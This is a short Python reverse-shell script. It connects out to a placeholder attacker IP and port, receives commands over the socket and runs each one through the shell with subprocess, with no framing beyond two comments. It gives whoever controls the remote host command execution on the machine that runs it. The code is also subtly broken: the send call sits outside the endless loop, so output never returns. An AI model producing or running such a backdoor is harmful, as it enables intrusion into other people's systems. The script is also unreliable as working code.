import socket
import subprocess

host = 'Your IP address here'  # The remote host
port = YOUR_PORT_NUMBER        # The same port as used by the server
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect((host,port))
while 1:
     data = s.recv(1024)
     proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
     stdout_value = proc.stdout.read() + proc.stderr.read()
     args = stdout_value
s.send(args)
s.close()